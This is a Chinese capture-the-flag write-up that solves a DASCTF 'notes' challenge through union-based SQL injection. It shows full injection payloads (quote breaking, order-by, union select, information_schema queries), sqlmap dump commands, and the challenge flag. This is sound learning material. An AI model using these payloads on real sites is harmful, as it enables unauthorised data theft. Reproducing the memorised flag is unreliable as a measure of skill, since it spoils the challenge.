# 【DASCTF】notes - union SQL注入 + sqlmap 梭哈

> 平台：DASCTF ｜ flag：`n1book{union_select_is_so_cool}` ｜ 2026-08-03
> 定位：SQL 注入系列第 1 题（union 注入 + sqlmap 工具实战）

---

## 一、题目面貌

```
URL：靶机/index.php?id=1
页面：notes（笔记网站），id 参数控制显示哪条笔记
id=1 → "Happy" 笔记
id=2 → 学习类笔记
id=3 → 提示笔记："if too diffcult ,add &tips=1 to the url !"
```

## 二、考点

| 考点 | 内容 |
|---|---|
| SQL 注入（union 查询） | `id` 参数，引号包裹 |
| 布尔盲注 | 逐位猜数据（手动路径） |
| 工具实战 | sqlmap 一把梭（秒拖库） |
| tips 提示参数 | 题目自带的作弊开关 |

---

## 三、手动解题链（11 步）

### 第 1 步：信息收集
【动作】访问 `index.php?id=1`
【发现】响应头 `X-Powered-By: PHP/5.5.9` → PHP 老版本；页面是笔记列表
【结论】`id` 参数是 SQL 注入经典入口

### 第 2 步：探测注入点
【动作】`id=1'`（加单引号）
【发现】页面变空（无内容）→ 引号把查询弄坏了 → **注入点存在**
【注意】无报错回显 → 不是报错注入

### 第 3 步：踩坑！布尔测试无效
【动作】`id=1 and 1=1`（真）vs `id=1 and 1=2`（假）
【发现】两者都显示内容！
【原因】**MySQL 字符串转数字坑**：`id='1 and 1=2'` 中字符串与整数列比较 → MySQL 截取开头数字 `1` → 变 `id=1` 恒真
【教训】发现布尔测不出来，先怀疑"引号包裹 + 数字转换"，别急着下结论

### 第 4 步：白嫖提示
【动作】看 id=3 的笔记内容
【发现】提示 `add &tips=1 to the url !`
【动作】`index.php?id=3&tips=1`
【发现】**SQL 原形毕露**：`select * from notes where id ='3'`
【结论】①id 被单引号包裹 ②注入点确定

### 第 5 步：正确姿势测布尔（补引号）
【动作】`id=1' and '1'='1`（真）→ 显示内容
【动作】`id=1' and '1'='2`（假）→ 空
【结论】布尔盲注打通；`-- -` 注释可用

### 第 6 步：数列数
【动作】`id=1' order by N-- -`（N=1,2,3...）
【发现】order by 3 正常，order by 4 起报错 → **notes 表 3 列**

### 第 7 步：找回显位
【动作】`id=-1' union select 1,2,3-- -`（id=-1 让前查询无结果，只看 union 的）
【发现】页面 `<p>3</p>` → **第 3 列回显**

### 第 8 步：拿数据库名
【动作】`id=-1' union select 1,2,database()-- -`
【发现】`note`

### 第 9 步：拿表名
【动作】`...group_concat(table_name) from information_schema.tables where table_schema=database()-- -`
【发现】`fl4g, notes`

### 第 10 步：拿列名
【动作】`...group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='fl4g'-- -`
【发现】`fllllag`

### 第 11 步：拖数据
【动作】`id=-1' union select 1,2,fllllag from fl4g-- -`
【结果】**flag = `n1book{union_select_is_so_cool}`**

---

## 四、sqlmap 梭哈（秒解验证）

工具路径：`C:\Users\Hong\Desktop\ctf_tools\web_tools\sqlmap-master\sqlmap-master\sqlmap.py`

```bash
# ① 列数据库
python sqlmap.py -u "靶机/index.php?id=1" --batch --dbs
# ② 列表
python sqlmap.py -u "靶机/index.php?id=1" --batch -D note --tables
# ③ 拖数据
python sqlmap.py -u "靶机/index.php?id=1" --batch -D note -T fl4g --dump
```

结果与手动完全一致：MySQL(MariaDB)、3 列、数据库 note、表 fl4g/notes、flag 秒出。
详细参数速查见 `Web笔记13-sqlmap速查.md`。

---

## 五、心法总结

1. **tips/提示参数**：先试 `&tips=1`、`&debug=1` 等，能直接看源码/查询
2. **引号包裹的注入**：查询是 `id='...'` → payload 要闭合引号再注释尾部
3. **布尔测不出先怀疑数字转换**：MySQL 字符串转数字坑
4. **手动打底 + 工具梭哈**：先手动摸清结构（列数/库名/回显位），sqlmap 秒验证/秒拖
5. **信息收集别漏提示**：id=3 的笔记就是通关钥匙

---

## 相关笔记
- `Web笔记13-sqlmap速查.md`（工具用法）
- `Web笔记12-服务器架构与文件系统.md`（概念）
